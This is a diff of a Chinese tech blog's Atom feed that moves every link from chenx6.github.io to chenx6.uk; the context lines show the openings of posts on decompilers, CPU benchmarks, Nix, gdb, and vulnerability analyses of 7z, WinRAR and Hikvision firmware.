@@ -2,11 +2,11 @@
 <feed xmlns="http://www.w3.org/2005/Atom" xml:lang="zh_CN">
     <title>二进制咸鱼的自我救赎</title>
     <subtitle>幸福往往是摸的透彻，而敬业的心却常常隐藏。</subtitle>
-    <link rel="self" type="application/atom+xml" href="https://chenx6.github.io/atom.xml"/>
-    <link rel="alternate" type="text/html" href="https://chenx6.github.io/"/>
+    <link rel="self" type="application/atom+xml" href="https://chenx6.uk/atom.xml"/>
+    <link rel="alternate" type="text/html" href="https://chenx6.uk"/>
     <generator uri="https://www.getzola.org/">Zola</generator>
     <updated>2026-09-03T00:00:00+00:00</updated>
-    <id>https://chenx6.github.io/atom.xml</id>
+    <id>https://chenx6.uk/atom.xml</id>
     <entry xml:lang="zh_CN">
         <title>继续完善不太能用的 Python 反编译器</title>
         <published>2026-09-03T00:00:00+00:00</published>
@@ -20,10 +20,10 @@
           </name>
         </author>
         
-        <link rel="alternate" type="text/html" href="https://chenx6.github.io/post/decompiler_python_v2/"/>
-        <id>https://chenx6.github.io/post/decompiler_python_v2/</id>
+        <link rel="alternate" type="text/html" href="https://chenx6.uk/post/decompiler_python_v2/"/>
+        <id>https://chenx6.uk/post/decompiler_python_v2/</id>
         
-        <content type="html" xml:base="https://chenx6.github.io/post/decompiler_python_v2/">&lt;p&gt;在之前的文章里，我实现了一个不太能用的 Python 反编译器，后来在不断咨询 LLM 修复建议，并手动分析和实现之后，现在能对简单的程序进行反编译了。在这篇文章里，我讲一下主要的修复项。&lt;&#x2F;p&gt;
+        <content type="html" xml:base="https://chenx6.uk/post/decompiler_python_v2/">&lt;p&gt;在之前的文章里，我实现了一个不太能用的 Python 反编译器，后来在不断咨询 LLM 修复建议，并手动分析和实现之后，现在能对简单的程序进行反编译了。在这篇文章里，我讲一下主要的修复项。&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;控制流图恢复&quot;&gt;控制流图恢复&lt;&#x2F;h2&gt;
 &lt;p&gt;这里我使用了更成熟的方案。首先遍历所有汇编指令，根据不同类型的跳转语句，FOR_ITER 语句，来收集每一个 BB 的开头偏移，然后根据这些开头偏移，将一堆的指令切分到不同的 BB 中，最后再根据 BB 中的条件跳转，非条件跳转语句，来构建整个控制流图。如果两个 BB 相邻，而且前一个 BB 最后的指令不是跳转语句，那也将其连接。&lt;&#x2F;p&gt;
 &lt;p&gt;相对于之前的方案，新的方案对 BB 切分更清晰，并且可以在 CFG 中添加边的类型，例如是条件为真的跳转，还是别的跳转。&lt;&#x2F;p&gt;
@@ -70,10 +70,10 @@
           </name>
         </author>
         
-        <link rel="alternate" type="text/html" href="https://chenx6.github.io/post/7z_path_traversal/"/>
-        <id>https://chenx6.github.io/post/7z_path_traversal/</id>
+        <link rel="alternate" type="text/html" href="https://chenx6.uk/post/7z_path_traversal/"/>
+        <id>https://chenx6.uk/post/7z_path_traversal/</id>
         
-        <content type="html" xml:base="https://chenx6.github.io/post/7z_path_traversal/">&lt;p&gt;去年在上网冲浪的时候发现 7z 连续在软链接处理上爆出来了 3 个漏洞，而且是可稳定利用的路径穿梭漏洞，所以就想自己看看为什么会出现这种情况，两者之间是否有共通点。&lt;&#x2F;p&gt;
+        <content type="html" xml:base="https://chenx6.uk/post/7z_path_traversal/">&lt;p&gt;去年在上网冲浪的时候发现 7z 连续在软链接处理上爆出来了 3 个漏洞，而且是可稳定利用的路径穿梭漏洞，所以就想自己看看为什么会出现这种情况，两者之间是否有共通点。&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;构建&quot;&gt;构建&lt;&#x2F;h2&gt;
 &lt;p&gt;在 Linux 下执行下面命令即可构建。&lt;&#x2F;p&gt;
 &lt;pre class=&quot;giallo&quot; style=&quot;color-scheme: light dark; color: light-dark(#90A4AE, #BABED8); background-color: light-dark(#FAFAFA, #292D3E);&quot;&gt;&lt;code data-lang=&quot;shellscript&quot;&gt;&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: light-dark(#6182B8, #82AAFF);&quot;&gt;cd&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#91B859, #C3E88D);&quot;&gt; CPP&#x2F;7zip&#x2F;Bundles&#x2F;Alone&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
@@ -170,10 +170,10 @@
           </name>
         </author>
         
-        <link rel="alternate" type="text/html" href="https://chenx6.github.io/post/aoc_2025/"/>
-        <id>https://chenx6.github.io/post/aoc_2025/</id>
+        <link rel="alternate" type="text/html" href="https://chenx6.uk/post/aoc_2025/"/>
+        <id>https://chenx6.uk/post/aoc_2025/</id>
         
-        <content type="html" xml:base="https://chenx6.github.io/post/aoc_2025/">&lt;p&gt;连续几年都参加了 AOC，但是没有一年能完赛，今年终于完成了比赛。今年的题目不会很难，而且题量缩减，再加上大模型也能给一点思路（其实用大模型写代码的话估计可以秒杀很多题目，但是我没有这么用），所以还是能做完的。这篇文章主要讲一下里面用到了一些算法的地方。&lt;&#x2F;p&gt;
+        <content type="html" xml:base="https://chenx6.uk/post/aoc_2025/">&lt;p&gt;连续几年都参加了 AOC，但是没有一年能完赛，今年终于完成了比赛。今年的题目不会很难，而且题量缩减，再加上大模型也能给一点思路（其实用大模型写代码的话估计可以秒杀很多题目，但是我没有这么用），所以还是能做完的。这篇文章主要讲一下里面用到了一些算法的地方。&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;Day5_Part2&quot;&gt;Day5 Part2&lt;&#x2F;h2&gt;
 &lt;p&gt;题目可以理解为找出给定的所有区间内的整数。而且也给了提示区间是有重复的，所以我们遍历所有区间，来不断的合并重复的区间，并删除原本的区间，直到没有线段可以合并，说明合并完成。假设两个区间分别 &lt;code&gt;(start, end)&lt;&#x2F;code&gt; 和 &lt;code&gt;(a_start, a_end)&lt;&#x2F;code&gt;，判断在 x 轴上重合可以用 &lt;code&gt;max(start, a_start) &amp;lt;= min(end, a_end)&lt;&#x2F;code&gt; 这个公式来判断。&lt;&#x2F;p&gt;
 &lt;pre class=&quot;giallo&quot; style=&quot;color-scheme: light dark; color: light-dark(#90A4AE, #BABED8); background-color: light-dark(#FAFAFA, #292D3E);&quot;&gt;&lt;code data-lang=&quot;python&quot;&gt;&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: light-dark(#9C3EDA, #C792EA);&quot;&gt;def&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#6182B8, #82AAFF);&quot;&gt; solve_p2&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style: italic;&quot;&gt;lines&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt; list&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#E2931D, #FFCB6B);&quot;&gt;str&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt;:&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
@@ -434,10 +434,10 @@
           </name>
         </author>
         
-        <link rel="alternate" type="text/html" href="https://chenx6.github.io/post/decompiler_python/"/>
-        <id>https://chenx6.github.io/post/decompiler_python/</id>
+        <link rel="alternate" type="text/html" href="https://chenx6.uk/post/decompiler_python/"/>
+        <id>https://chenx6.uk/post/decompiler_python/</id>
         
-        <content type="html" xml:base="https://chenx6.github.io/post/decompiler_python/">&lt;p&gt;写一个反编译器是我在大学的时候就有的一个想法，因为现有的反编译器支持的架构和语言很有限，能自己写反编译器就能支持更多语言了。结果发现这是一个大坑，公开的资料很少，而且需要手动处理很多很多的边界条件，在研究了好几个月之后，我才开始写这一篇文章，记录一个还没完成的反编译器实现。&lt;em&gt;代码质量不好，并且可能无法工作，敬请见谅。&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;
+        <content type="html" xml:base="https://chenx6.uk/post/decompiler_python/">&lt;p&gt;写一个反编译器是我在大学的时候就有的一个想法，因为现有的反编译器支持的架构和语言很有限，能自己写反编译器就能支持更多语言了。结果发现这是一个大坑，公开的资料很少，而且需要手动处理很多很多的边界条件，在研究了好几个月之后，我才开始写这一篇文章，记录一个还没完成的反编译器实现。&lt;em&gt;代码质量不好，并且可能无法工作，敬请见谅。&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;
 &lt;p&gt;由于 Python 在不同版本之间，可能会调整字节码的生成逻辑，所以较难找到一个通用的规则去进行匹配，这篇文章里的内容只针对 Python 3.11 的字节码。&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;总体架构&quot;&gt;总体架构&lt;&#x2F;h2&gt;
 &lt;p&gt;Python 在执行程序的时候，会将 Python 代码转换成 Python 字节码，然后供 Python 解释器执行。Python 解释器是一个栈虚拟机，并且由于 Python 是一个动态类型语言，所以反编译器的大致架构如下。&lt;&#x2F;p&gt;
@@ -569,10 +569,10 @@
           </name>
         </author>
         
-        <link rel="alternate" type="text/html" href="https://chenx6.github.io/post/cpu_mircoarch_bench/"/>
-        <id>https://chenx6.github.io/post/cpu_mircoarch_bench/</id>
+        <link rel="alternate" type="text/html" href="https://chenx6.uk/post/cpu_mircoarch_bench/"/>
+        <id>https://chenx6.uk/post/cpu_mircoarch_bench/</id>
         
-        <content type="html" xml:base="https://chenx6.github.io/post/cpu_mircoarch_bench/">&lt;p&gt;之前看了 Chips and cheese 这个博客，发现他们对 CPU 的测试方法很独特，不是像国内的 KOL 一样跑几个跑分软件然后拿分数进行对比，而是会测试像 CPU 的分支预测，乱序执行，内存读取延迟等指标。所以我也想学习一下这些测试的原理。&lt;&#x2F;p&gt;
+        <content type="html" xml:base="https://chenx6.uk/post/cpu_mircoarch_bench/">&lt;p&gt;之前看了 Chips and cheese 这个博客，发现他们对 CPU 的测试方法很独特，不是像国内的 KOL 一样跑几个跑分软件然后拿分数进行对比，而是会测试像 CPU 的分支预测，乱序执行，内存读取延迟等指标。所以我也想学习一下这些测试的原理。&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;指令重排序缓存(Reorder_Buffer)&quot;&gt;指令重排序缓存(Reorder Buffer)&lt;&#x2F;h2&gt;
 &lt;p&gt;现代 CPU 会使用乱序执行来加快指令的执行速度。但是在程序员视角里，指令是顺序执行的。这时候就需要通过指令重排序缓存(Reorder Buffer)来记录下这些乱序执行的指令的顺序，执行完成的指令不会立即提交，而是先在缓存中等着，在所有指令都提交后才提交到寄存器中。&lt;&#x2F;p&gt;
 &lt;p&gt;因为在缓存中的指令执行是并行的，所以可以通过填充一条需要长时间执行的指令来阻塞提交，并且观察在阻塞提交时候，还能执行多少条指令，来推算出指令重排序缓存大小。&lt;&#x2F;p&gt;
@@ -755,10 +755,10 @@
           </name>
         </author>
         
-        <link rel="alternate" type="text/html" href="https://chenx6.github.io/post/pyinfra/"/>
-        <id>https://chenx6.github.io/post/pyinfra/</id>
+        <link rel="alternate" type="text/html" href="https://chenx6.uk/post/pyinfra/"/>
+        <id>https://chenx6.uk/post/pyinfra/</id>
         
-        <content type="html" xml:base="https://chenx6.github.io/post/pyinfra/">&lt;p&gt;每次购买新服务器都要手动配置一堆的基础服务，而且配置过程太无聊了。经过研究和试验之后发现：通过 shell 脚本去执行配置就要被 shell script 的很多坑爹细节坑到，而且 shell script 本身功能有有限，还是需要借助一些外部软件来实现更多功能；ansible 配置太复杂，而且我个人不喜欢 yaml 格式，觉得这格式过于奇葩；Nix 学习成本高，而且比较占磁盘空间。&lt;&#x2F;p&gt;
+        <content type="html" xml:base="https://chenx6.uk/post/pyinfra/">&lt;p&gt;每次购买新服务器都要手动配置一堆的基础服务，而且配置过程太无聊了。经过研究和试验之后发现：通过 shell 脚本去执行配置就要被 shell script 的很多坑爹细节坑到，而且 shell script 本身功能有有限，还是需要借助一些外部软件来实现更多功能；ansible 配置太复杂，而且我个人不喜欢 yaml 格式，觉得这格式过于奇葩；Nix 学习成本高，而且比较占磁盘空间。&lt;&#x2F;p&gt;
 &lt;p&gt;有一天，我在 Hacker News 上刷到了 &lt;a rel=&quot;external&quot; href=&quot;https:&#x2F;&#x2F;pyinfra.com&#x2F;&quot;&gt;pyinfra&lt;&#x2F;a&gt; 这个软件，可以通过 Python 代码进行声明式的配置系统。不觉得很酷吗？作为一个懒狗，我觉得这太酷了，很符合我对自动化运维的想象。&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;基本概念&quot;&gt;基本概念&lt;&#x2F;h2&gt;
 &lt;p&gt;安装 pyinfra 很简单，使用 &lt;code&gt;pipx install pyinfra&lt;&#x2F;code&gt; 就完成安装了。&lt;&#x2F;p&gt;
@@ -912,10 +912,10 @@
           </name>
         </author>
         
-        <link rel="alternate" type="text/html" href="https://chenx6.github.io/post/nix-on-droid/"/>
-        <id>https://chenx6.github.io/post/nix-on-droid/</id>
+        <link rel="alternate" type="text/html" href="https://chenx6.uk/post/nix-on-droid/"/>
+        <id>https://chenx6.uk/post/nix-on-droid/</id>
         
-        <content type="html" xml:base="https://chenx6.github.io/post/nix-on-droid/">&lt;p&gt;对 Linux 感兴趣的用户应该会接触过很多奇怪的 Linux 发行版，例如使用声明式配置文件配置系统的 NixOS，通过一套配置文件就可以搭建起来一个系统。但是 NixOS 的安装和学习曲线都算比较陡峭的，在互联网冲浪的时候，发现有个 &lt;a rel=&quot;external&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;nix-community&#x2F;nix-on-droid&quot;&gt;nix-on-droid&lt;&#x2F;a&gt; 项目，可以在安卓系统上搭建起一个迷你版本的 Nix 环境，所以就下载体验了一波，并写文记录使用。&lt;&#x2F;p&gt;
+        <content type="html" xml:base="https://chenx6.uk/post/nix-on-droid/">&lt;p&gt;对 Linux 感兴趣的用户应该会接触过很多奇怪的 Linux 发行版，例如使用声明式配置文件配置系统的 NixOS，通过一套配置文件就可以搭建起来一个系统。但是 NixOS 的安装和学习曲线都算比较陡峭的，在互联网冲浪的时候，发现有个 &lt;a rel=&quot;external&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;nix-community&#x2F;nix-on-droid&quot;&gt;nix-on-droid&lt;&#x2F;a&gt; 项目，可以在安卓系统上搭建起一个迷你版本的 Nix 环境，所以就下载体验了一波，并写文记录使用。&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;安装&quot;&gt;安装&lt;&#x2F;h2&gt;
 &lt;p&gt;通过 F-Droid 就可以下载项目的 APK 安装包，安装 APK 之后会进行初始化，该项目会自动从网上下载一个初始化的镜像并进行初始化，在下载和安装完之后就会进入系统了。&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;Nix_语言简易教程&quot;&gt;Nix 语言简易教程&lt;&#x2F;h2&gt;
@@ -963,7 +963,7 @@
 &lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: light-dark(#9C3EDA, #C792EA);&quot;&gt;  imports&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt; =&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt; [&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#91B859, #C3E88D);&quot;&gt; .&#x2F;kde.nix&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt; ]&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt;;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
 &lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;  .&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
 &lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt;}&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;&lt;h3 id=&quot;其他&quot;&gt;其他&lt;&#x2F;h3&gt;
-&lt;p&gt;上面是一些常见的概念，NixOS 还可以做到修改包的默认配置，添加自定义的包等功能，这些功能请查询 &lt;a href=&quot;https:&#x2F;&#x2F;chenx6.github.io&#x2F;post&#x2F;nix-on-droid&#x2F;#refs&quot;&gt;Refs&lt;&#x2F;a&gt; 中提到的官方文档。&lt;&#x2F;p&gt;
+&lt;p&gt;上面是一些常见的概念，NixOS 还可以做到修改包的默认配置，添加自定义的包等功能，这些功能请查询 &lt;a href=&quot;https:&#x2F;&#x2F;chenx6.uk&#x2F;post&#x2F;nix-on-droid&#x2F;#refs&quot;&gt;Refs&lt;&#x2F;a&gt; 中提到的官方文档。&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;实战&quot;&gt;实战&lt;&#x2F;h2&gt;
 &lt;h3 id=&quot;使用_nix-shell_来创建开发环境&quot;&gt;使用 nix-shell 来创建开发环境&lt;&#x2F;h3&gt;
 &lt;p&gt;我平时用 Python 来写一些脚本时，需要一个开发环境。这时候就可以通过 nix-shell 命令和相关配置来配置所需要的软件和包。&lt;&#x2F;p&gt;
@@ -1081,10 +1081,10 @@
           </name>
         </author>
         
-        <link rel="alternate" type="text/html" href="https://chenx6.github.io/post/gdb_py/"/>
-        <id>https://chenx6.github.io/post/gdb_py/</id>
+        <link rel="alternate" type="text/html" href="https://chenx6.uk/post/gdb_py/"/>
+        <id>https://chenx6.uk/post/gdb_py/</id>
         
-        <content type="html" xml:base="https://chenx6.github.io/post/gdb_py/">&lt;p&gt;在工作中碰到了很多地方只能用 gdb 进行调试，并且得进行很多冗余的操作。经过资料查询后发现，可以使用 Python 对 gdb 进行 api 调用，但是网上相关文档比较的少，所以本文将记录一些相关操作。&lt;&#x2F;p&gt;
+        <content type="html" xml:base="https://chenx6.uk/post/gdb_py/">&lt;p&gt;在工作中碰到了很多地方只能用 gdb 进行调试，并且得进行很多冗余的操作。经过资料查询后发现，可以使用 Python 对 gdb 进行 api 调用，但是网上相关文档比较的少，所以本文将记录一些相关操作。&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;相关_API_介绍&quot;&gt;相关 API 介绍&lt;&#x2F;h2&gt;
 &lt;h3 id=&quot;基本操作&quot;&gt;基本操作&lt;&#x2F;h3&gt;
 &lt;p&gt;&lt;code&gt;gdb.execute (command [, from_tty [, to_string]])&lt;&#x2F;code&gt; 执行 gdb 命令。&lt;&#x2F;p&gt;
@@ -1175,10 +1175,10 @@
           </name>
         </author>
         
-        <link rel="alternate" type="text/html" href="https://chenx6.github.io/post/sum_type/"/>
-        <id>https://chenx6.github.io/post/sum_type/</id>
+        <link rel="alternate" type="text/html" href="https://chenx6.uk/post/sum_type/"/>
+        <id>https://chenx6.uk/post/sum_type/</id>
         
-        <content type="html" xml:base="https://chenx6.github.io/post/sum_type/">&lt;p&gt;在 C 语言中，没有类似 ML 系语言或者 Rust 那样的 enum 实现。所以本文用于记录 C 中那些用于实现这个特性的相关方法，例如 tagged union, tagged pointer, NaN boxing。&lt;&#x2F;p&gt;
+        <content type="html" xml:base="https://chenx6.uk/post/sum_type/">&lt;p&gt;在 C 语言中，没有类似 ML 系语言或者 Rust 那样的 enum 实现。所以本文用于记录 C 中那些用于实现这个特性的相关方法，例如 tagged union, tagged pointer, NaN boxing。&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;在_Rust_中的表示&quot;&gt;在 Rust 中的表示&lt;&#x2F;h2&gt;
 &lt;p&gt;例如在之前的博客中，我使用了下面的代码来表示词法分析中分析的 Token。&lt;&#x2F;p&gt;
 &lt;pre class=&quot;giallo&quot; style=&quot;color-scheme: light dark; color: light-dark(#90A4AE, #BABED8); background-color: light-dark(#FAFAFA, #292D3E);&quot;&gt;&lt;code data-lang=&quot;rust&quot;&gt;&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: light-dark(#F76D47, #F78C6C);&quot;&gt;pub&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#9C3EDA, #C792EA);&quot;&gt; enum&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#E2931D, #FFCB6B);&quot;&gt; Token&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt; {&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
@@ -1244,10 +1244,10 @@
           </name>
         </author>
         
-        <link rel="alternate" type="text/html" href="https://chenx6.github.io/post/winrar/"/>
-        <id>https://chenx6.github.io/post/winrar/</id>
+        <link rel="alternate" type="text/html" href="https://chenx6.uk/post/winrar/"/>
+        <id>https://chenx6.uk/post/winrar/</id>
         
-        <content type="html" xml:base="https://chenx6.github.io/post/winrar/">&lt;p&gt;其实这个漏洞的公告一出来我就开始进行分析了，只是因为空闲时间的利用非常的差，所以分析的很慢，最多就确认了漏洞修复地点。后来大佬们详细的分析就发出来了，所以这篇文章只能算是复现文章了...&lt;&#x2F;p&gt;
+        <content type="html" xml:base="https://chenx6.uk/post/winrar/">&lt;p&gt;其实这个漏洞的公告一出来我就开始进行分析了，只是因为空闲时间的利用非常的差，所以分析的很慢，最多就确认了漏洞修复地点。后来大佬们详细的分析就发出来了，所以这篇文章只能算是复现文章了...&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;CVE-2023-40477&quot;&gt;CVE-2023-40477&lt;&#x2F;h2&gt;
 &lt;p&gt;从下面的官方公告中可以知道代码修复的地方是在 RAR4 恢复卷的处理代码中。&lt;&#x2F;p&gt;
 &lt;blockquote&gt;
@@ -1351,7 +1351,7 @@
 &lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);font-style: italic;&quot;&gt;      if&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt; (&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#E53935, #F07178);&quot;&gt; v3 &lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt;==&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#F76D47, #F78C6C);&quot;&gt; 1&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt; )&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
 &lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);font-style: italic;&quot;&gt;        return&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#F76D47, #F78C6C);&quot;&gt; 0&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt;;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
 &lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: light-dark(#39ADB5, #89DDFF);&quot;&gt;    }&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
-&lt;p&gt;配合上 &lt;code&gt;ShellExecuteExW&lt;&#x2F;code&gt; 对文件的处理，就造成了点击一个文件，让另一个文件被调用执行的情况...详细分析请看 &lt;a href=&quot;https:&#x2F;&#x2F;chenx6.github.io&#x2F;post&#x2F;winrar&#x2F;#refs&quot;&gt;Refs&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;配合上 &lt;code&gt;ShellExecuteExW&lt;&#x2F;code&gt; 对文件的处理，就造成了点击一个文件，让另一个文件被调用执行的情况...详细分析请看 &lt;a href=&quot;https:&#x2F;&#x2F;chenx6.uk&#x2F;post&#x2F;winrar&#x2F;#refs&quot;&gt;Refs&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;总结&quot;&gt;总结&lt;&#x2F;h2&gt;
 &lt;p&gt;CVE-2023-40477 的漏洞应该是可以被避免的，存储数组索引的数据，应该使用 unsigned 类型，并且在通过不可信任的数据，访问数组时候需要检查边界。而 CVE-2023-38831 则是碰上了一个逻辑问题，在比较字符串时候没有比较长度。&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;Refs&quot;&gt;Refs&lt;&#x2F;h2&gt;
@@ -1380,10 +1380,10 @@
           </name>
         </author>
         
-        <link rel="alternate" type="text/html" href="https://chenx6.github.io/post/parser_combinator/"/>
-        <id>https://chenx6.github.io/post/parser_combinator/</id>
+        <link rel="alternate" type="text/html" href="https://chenx6.uk/post/parser_combinator/"/>
+        <id>https://chenx6.uk/post/parser_combinator/</id>
         
-        <content type="html" xml:base="https://chenx6.github.io/post/parser_combinator/">&lt;p&gt;因为我是骑自行车上下班的，对风向和风速很敏感，然后我住的离机场比较近，于是我想通过机场的天气状况判断下我的通勤是否容易。在翻阅资料后，发现机场的天气是使用 METAR 报文进行发送的，所以我将尝试用 Parser combinator 对报文进行解析，来获得天气状况。&lt;&#x2F;p&gt;
+        <content type="html" xml:base="https://chenx6.uk/post/parser_combinator/">&lt;p&gt;因为我是骑自行车上下班的，对风向和风速很敏感，然后我住的离机场比较近，于是我想通过机场的天气状况判断下我的通勤是否容易。在翻阅资料后，发现机场的天气是使用 METAR 报文进行发送的，所以我将尝试用 Parser combinator 对报文进行解析，来获得天气状况。&lt;&#x2F;p&gt;
 &lt;p&gt;本文采用的是 Python 进行编程，因为 Python 明显会比 Haskell 和 Rust 简单易读，Python 的缺点就是 lambda 函数很菜。&lt;&#x2F;p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;在写文章的时候发现我写的 parser 解析的信息不够完全，所以这个 parser 只供学习使用，请勿用于生产环境！&lt;&#x2F;p&gt;
@@ -1601,10 +1601,10 @@
           </name>
         </author>
         
-        <link rel="alternate" type="text/html" href="https://chenx6.github.io/post/hikvision/"/>
-        <id>https://chenx6.github.io/post/hikvision/</id>
+        <link rel="alternate" type="text/html" href="https://chenx6.uk/post/hikvision/"/>
+        <id>https://chenx6.uk/post/hikvision/</id>
         
-        <content type="html" xml:base="https://chenx6.github.io/post/hikvision/">&lt;p&gt;高中时候曾经当过一段时间的脚本小子，通过 CVE-2017-7921 拿下过一波摄像头，体验了一把游戏看门狗里的感觉。所以在今天，在掌握了一定的技术之后，我将尝试对海康威视的固件进行重新分析。&lt;&#x2F;p&gt;
+        <content type="html" xml:base="https://chenx6.uk/post/hikvision/">&lt;p&gt;高中时候曾经当过一段时间的脚本小子，通过 CVE-2017-7921 拿下过一波摄像头，体验了一把游戏看门狗里的感觉。所以在今天，在掌握了一定的技术之后，我将尝试对海康威视的固件进行重新分析。&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;固件下载&quot;&gt;固件下载&lt;&#x2F;h2&gt;
 &lt;p&gt;&lt;a rel=&quot;external&quot; href=&quot;https:&#x2F;&#x2F;www.hikvisioneurope.com&#x2F;eu&#x2F;portal&#x2F;&quot;&gt;https:&#x2F;&#x2F;www.hikvisioneurope.com&#x2F;eu&#x2F;portal&#x2F;&lt;&#x2F;a&gt;，我使用的是 R0 和 R6 的固件。&lt;&#x2F;p&gt;
 &lt;h2 id=&quot;固件格式&quot;&gt;固件格式&lt;&#x2F;h2&gt;
@@ -1663,7 +1663,7 @@
 &lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;c0 0e 00 00 64 02 00 00 78 5e 63 cc 74 fd e8 40  À   d   x cÌtýè &lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
 &lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;86 67 2d 7c 07 37 57 57 3d c9 d3 37 70 bc 02 5e   g   7WW ÉÓ7p¼  &lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
 &lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;68 49 6d 61 67 65 00 74 fd e8 40 86 67 2d 7c 07  hImage týè  g  &lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
-&lt;p&gt;解密后的文件格式可以参考 &lt;a href=&quot;https:&#x2F;&#x2F;chenx6.github.io&#x2F;post&#x2F;hikvision&#x2F;#refs&quot;&gt;Refs&lt;&#x2F;a&gt; 中的 &quot;(转载文章)Hik or hack? (NOT) IoT Security Using Hikvision IP Cameras&quot;，解密固件可以参考 &lt;a href=&quot;https:&#x2F;&#x2F;chenx6.github.io&#x2F;post&#x2F;hikvision&#x2F;#refs&quot;&gt;Refs&lt;&#x2F;a&gt; 中的 &quot;HaToan&#x2F;Decrypt-Firmware-Hikvision&quot; 和 &quot;MatrixEditor&#x2F;hiktools&quot; 项目。当然，我也写了一个可以解密固件的脚本，比之前的脚本开源工具相比能解密更多的固件格式，也很容易对脚本进行扩展，地址&lt;a rel=&quot;external&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;chenx6&#x2F;gadget&#x2F;blob&#x2F;master&#x2F;hik_firmware&#x2F;decrypt.py&quot;&gt;在这&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
